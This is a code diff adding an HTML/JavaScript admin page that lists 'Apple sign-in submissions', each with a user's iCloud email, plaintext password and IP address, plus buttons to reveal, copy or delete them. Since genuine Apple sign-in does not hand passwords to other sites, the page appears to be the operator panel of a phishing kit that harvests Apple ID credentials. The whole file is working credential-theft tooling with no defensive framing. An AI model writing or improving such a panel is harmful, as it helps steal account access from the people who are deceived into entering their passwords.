@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Apple Sign-ins — Admin</title>
+<script>
+  (function(){
+    var t = localStorage.getItem("wsc_theme") || "dark";
+    document.documentElement.setAttribute("data-theme", t);
+  })();
+</script>
+<link rel="stylesheet" href="/css/styles.css">
+<link rel="stylesheet" href="/admin/shared.css">
+<style>
+  .as-pw {
+    font-family: var(--mono);
+    font-size: 12.5px;
+    color: var(--text-dim);
+    word-break: break-all;
+    line-height: 1.5;
+  }
+  .as-pw.hidden {
+    filter: blur(6px);
+    user-select: none;
+    cursor: pointer;
+  }
+  .as-reveal-btn {
+    background: none;
+    border: 1px solid var(--line);
+    color: var(--gold-bright);
+    font-size: 10.5px;
+    font-family: var(--sans);
+    padding: 3px 9px;
+    border-radius: 6px;
+    cursor: pointer;
+    margin-left: 8px;
+    transition: all 0.15s;
+  }
+  .as-reveal-btn:hover {
+    border-color: var(--gold);
+    background: rgba(59, 130, 246, 0.08);
+  }
+  .as-copy-btn {
+    background: none;
+    border: 1px solid var(--line);
+    color: var(--text-dim);
+    font-size: 10.5px;
+    font-family: var(--sans);
+    padding: 3px 9px;
+    border-radius: 6px;
+    cursor: pointer;
+    margin-left: 6px;
+    transition: all 0.15s;
+  }
+  .as-copy-btn:hover {
+    border-color: var(--gold);
+    color: var(--gold-bright);
+    background: rgba(59, 130, 246, 0.08);
+  }
+</style>
+</head>
+<body>
+
+<div class="auth-bg"></div>
+
+<button class="theme-toggle" id="theme-toggle-btn" aria-label="Toggle theme">
+  <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/>
+  </svg>
+  <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+    <circle cx="12" cy="12" r="4"/>
+    <path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41"/>
+  </svg>
+</button>
+
+<div class="adm-app" id="adm-app"></div>
+
+<script src="/js/theme.js"></script>
+<script src="/js/api.js"></script>
+<script src="/admin/shared.js"></script>
+<script>
+AdminShell.mount({
+  activeKey: "apple-signins",
+  title: "Apple Sign-ins",
+  onReady: function (root) {
+    root.innerHTML = `
+      <div class="adm-section" style="margin-top:0;">
+        <div class="adm-section-head">
+          <div>
+            <h2>Apple sign-in submissions</h2>
+            <p class="desc">
+              Users who signed in with an Apple ID. Each row shows the iCloud
+              email and password they submitted. Click <strong>Reveal</strong> to
+              view a password, or <strong>Copy</strong> to copy it to your clipboard.
+            </p>
+          </div>
+        </div>
+
+        <div class="adm-card">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;gap:12px;flex-wrap:wrap;">
+            <div style="font-size:13px;color:var(--text-dim);">
+              <strong id="as-count" style="color:var(--gold-bright);font-family:var(--mono);">0</strong>
+              submission<span id="as-count-plural">s</span>
+            </div>
+            <button class="btn" id="as-refresh" style="padding:8px 14px;font-size:12.5px;">Refresh</button>
+          </div>
+
+          <div id="as-table-wrap">
+            <div class="empty-state"><span class="loading">Loading submissions</span></div>
+          </div>
+        </div>
+      </div>
+    `;
+
+    document.getElementById("as-refresh").addEventListener("click", loadAppleSignins);
+    loadAppleSignins();
+  }
+});
+
+let AS_ROWS = [];
+
+async function loadAppleSignins() {
+  const wrap = document.getElementById("as-table-wrap");
+  try {
+    AS_ROWS = await AdminShell.api("/admin/apple-credentials");
+
+    document.getElementById("as-count").textContent = AS_ROWS.length;
+    document.getElementById("as-count-plural").textContent = AS_ROWS.length === 1 ? "" : "s";
+
+    AdminShell.setCount("count-apple", AS_ROWS.length);
+
+    renderTable();
+  } catch (err) {
+    wrap.innerHTML = `<div class="empty-state">Could not load submissions: ${AdminShell.escapeHtml(err.message)}</div>`;
+  }
+}
+
+function renderTable() {
+  const wrap = document.getElementById("as-table-wrap");
+
+  if (!AS_ROWS.length) {
+    wrap.innerHTML = '<div class="empty-state">No Apple submissions yet.</div>';
+    return;
+  }
+
+  const E = AdminShell.escapeHtml;
+
+  const html = AS_ROWS.map(r => {
+    const pw = r.password || "—";
+    return `
+      <tr data-id="${E(r.id)}">
+        <td>
+          <div style="font-weight:600;font-family:var(--mono);font-size:12.5px;color:var(--text);">
+            ${E(r.email || "—")}
+          </div>
+          <div class="muted" style="font-size:11.5px;">
+            IP: ${E(r.ip || "—")}
+          </div>
+        </td>
+        <td>
+          <span class="as-pw hidden" data-pw="${E(r.id)}">${E(pw)}</span>
+          <button class="as-reveal-btn" data-reveal="${E(r.id)}">Reveal</button>
+          <button class="as-copy-btn" data-copy="${E(r.id)}">Copy</button>
+        </td>
+        <td class="muted" style="font-size:11.5px;">
+          ${r.created_at ? new Date(r.created_at).toLocaleString() : "—"}
+        </td>
+        <td>
+          <button class="btn-sm reject" data-delete="${E(r.id)}">Delete</button>
+        </td>
+      </tr>
+    `;
+  }).join("");
+
+  wrap.innerHTML = `
+    <table>
+      <thead>
+        <tr>
+          <th>Apple ID</th>
+          <th>Password</th>
+          <th>Submitted</th>
+          <th></th>
+        </tr>
+      </thead>
+      <tbody>${html}</tbody>
+    </table>
+  `;
+
+  bindActions();
+}
+
+function bindActions() {
+  document.querySelectorAll("[data-reveal]").forEach(btn => {
+    btn.addEventListener("click", () => {
+      const id = btn.dataset.reveal;
+      const cell = document.querySelector(`[data-pw="${id}"]`);
+      if (!cell) return;
+      const isHidden = cell.classList.toggle("hidden");
+      btn.textContent = isHidden ? "Reveal" : "Hide";
+    });
+  });
+
+  document.querySelectorAll(".as-pw.hidden").forEach(cell => {
+    cell.addEventListener("click", () => {
+      const id = cell.dataset.pw;
+      const btn = document.querySelector(`[data-reveal="${id}"]`);
+      cell.classList.remove("hidden");
+      if (btn) btn.textContent = "Hide";
+    });
+  });
+
+  document.querySelectorAll("[data-copy]").forEach(btn => {
+    btn.addEventListener("click", async () => {
+      const id = btn.dataset.copy;
+      const row = AS_ROWS.find(r => r.id === id);
+      if (!row) return;
+      try {
+        await navigator.clipboard.writeText(row.password || "");
+        const original = btn.textContent;
+        btn.textContent = "Copied";
+        setTimeout(() => { btn.textContent = original; }, 1200);
+      } catch (err) {
+        alert("Could not copy: " + err.message);
+      }
+    });
+  });
+
+  document.querySelectorAll("[data-delete]").forEach(btn => {
+    btn.addEventListener("click", async () => {
+      const id = btn.dataset.delete;
+      if (!confirm("Delete this submission permanently?")) return;
+      btn.disabled = true; btn.textContent = "…";
+      try {
+        await AdminShell.api(`/admin/apple-credentials/${id}`, { method: "DELETE" });
+        loadAppleSignins();
+      } catch (err) {
+        alert("Could not delete: " + err.message);
+        btn.disabled = false; btn.textContent = "Delete";
+      }
+    });
+  });
+}
+</script>
+</body>
+</html>
